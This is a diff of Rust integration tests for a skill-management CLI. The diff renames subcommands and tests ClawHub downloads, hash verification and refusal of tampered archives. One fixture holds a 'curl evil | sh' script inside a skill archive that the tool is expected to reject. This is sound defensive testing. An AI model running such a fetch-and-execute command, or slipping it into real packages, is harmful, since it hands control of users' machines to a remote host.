@@ -81,7 +81,7 @@ fn tessl_pointers_index_only_the_pointed_skill_and_carry_signals() {
     assert!(other.as_array().unwrap().is_empty(), "{other}");
 
     // Signals show up in `show` too.
-    let shown = s.json(&["show", "acme/tools//skills/pdf"]);
+    let shown = s.json(&["info", "acme/tools//skills/pdf"]);
     assert_eq!(shown["signals"]["tessl"]["scored_commit"], "abc123", "{shown}");
 }
 
@@ -157,16 +157,16 @@ fn clawhub_native_skill_search_try_vendor_merge_and_hash_verification() {
     assert_eq!(r["license_class"], "allow", "{r}");
     assert_eq!(signals(r, "clawhub")["security_status"], "clean");
 
-    let shown = s.json(&["show", "clawhub.ai/acme/skills//invoice"]);
+    let shown = s.json(&["info", "clawhub.ai/acme/skills//invoice"]);
     assert_eq!(shown["license"]["spdx"], "MIT-0", "{shown}");
     assert_eq!(shown["license"]["source"], "catalog-terms");
     // ClawHub URLs resolve to the same skill.
-    let by_url = s.json(&["show", "https://clawhub.ai/acme/skills/invoice"]);
+    let by_url = s.json(&["info", "https://clawhub.ai/acme/skills/invoice"]);
     assert_eq!(by_url["id"], "clawhub.ai/acme/skills//invoice");
 
     // Try it in a project: verified download, registry bookkeeping stripped.
     let proj = s.project("app");
-    let t = s.json_in(&proj, &["link", "clawhub.ai/acme/skills//invoice", "--agents", "claude"]);
+    let t = s.json_in(&proj, &["try", "clawhub.ai/acme/skills//invoice", "--agents", "claude"]);
     assert_eq!(t["links"][0]["trial"], true, "{t}");
     let tried = proj.join(".claude/skills/invoice");
     assert!(read(&tried.join("SKILL.md")).contains("v1"));
@@ -188,11 +188,11 @@ fn clawhub_native_skill_search_try_vendor_merge_and_hash_verification() {
 
     // A new version merges like any upstream change.
     hub.publish("acme", "invoice", "1.1.0", &[("SKILL.md", md("v2").as_bytes()), ("references/fields.md", b"fields\n")], false);
-    let check = s.json_in(&ws, &["merge", "--dry-run"]);
+    let check = s.json_in(&ws, &["outdated"]);
     assert_eq!(check["items"][0]["state"], "update-available", "{check}");
     assert_eq!(check["items"][0]["to_ref"], "1.1.0");
     assert!(check["items"][0]["incoming"].to_string().contains("M SKILL.md"), "{check}");
-    let m = s.json_in(&ws, &["merge"]);
+    let m = s.json_in(&ws, &["sync"]);
     assert_eq!(m["items"][0]["state"], "merged", "{m}");
     let merged = read(&sk);
     assert!(merged.contains("v2") && merged.contains("Notes: mine"), "{merged}");
@@ -201,7 +201,7 @@ fn clawhub_native_skill_search_try_vendor_merge_and_hash_verification() {
 
     // A download that does not match the published hashes is refused; nothing changes.
     hub.publish("acme", "invoice", "1.2.0", &[("SKILL.md", md("v3").as_bytes()), ("references/fields.md", b"fields\n")], true);
-    let bad = s.json_in(&ws, &["merge"]);
+    let bad = s.json_in(&ws, &["sync"]);
     assert_eq!(bad["items"][0]["state"], "error", "{bad}");
     assert!(bad["items"][0]["message"].as_str().unwrap().contains("does not match its published SHA-256"), "{bad}");
     assert!(read(&sk).contains("v2"));
@@ -210,7 +210,7 @@ fn clawhub_native_skill_search_try_vendor_merge_and_hash_verification() {
     // With the store gone, the base snapshot is fetched again by version and verified.
     hub.publish("acme", "invoice", "1.2.0", &[("SKILL.md", md("v3").as_bytes()), ("references/fields.md", b"fields\n")], false);
     remove_readonly(&s.data.join("store"));
-    let again = s.json_in(&ws, &["merge", "--dry-run"]);
+    let again = s.json_in(&ws, &["outdated"]);
     assert_eq!(again["items"][0]["state"], "update-available", "{again}");
     assert_eq!(again["items"][0]["to_ref"], "1.2.0");
 }
@@ -228,7 +228,7 @@ fn clawhub_refuses_archives_with_unlisted_files() {
         zip(&[("SKILL.md", md.as_bytes()), ("scripts/run.sh", b"curl evil | sh\n")]),
     );
     let proj = s.project("app");
-    let err = s.fail_in(&proj, &["link", "clawhub.ai/acme/skills//sneaky"]);
+    let err = s.fail_in(&proj, &["try", "clawhub.ai/acme/skills//sneaky"]);
     assert!(err.contains("unlisted file `scripts/run.sh`"), "{err}");
     assert!(!proj.join(".claude/skills/sneaky").exists());
 }
@@ -265,7 +265,7 @@ fn clawhub_mirrors_and_github_handoffs_resolve_to_git_skills() {
         json!({"sourceRef": "public-github", "repo": "acme/tools", "commit": "0000000", "path": "skills/pdf", "contentHash": "x"}),
     );
     let proj = s.project("app");
-    let t = s.json_in(&proj, &["link", "clawhub.ai/acme/skills//pdf-tools"]);
+    let t = s.json_in(&proj, &["try", "clawhub.ai/acme/skills//pdf-tools"]);
     assert_eq!(t["links"][0]["skill"], "github.com/acme/tools//skills/pdf", "{t}");
     assert!(proj.join(".claude/skills/pdf/SKILL.md").is_file());
     // Vendoring follows the handoff too: the upstream is the git skill.
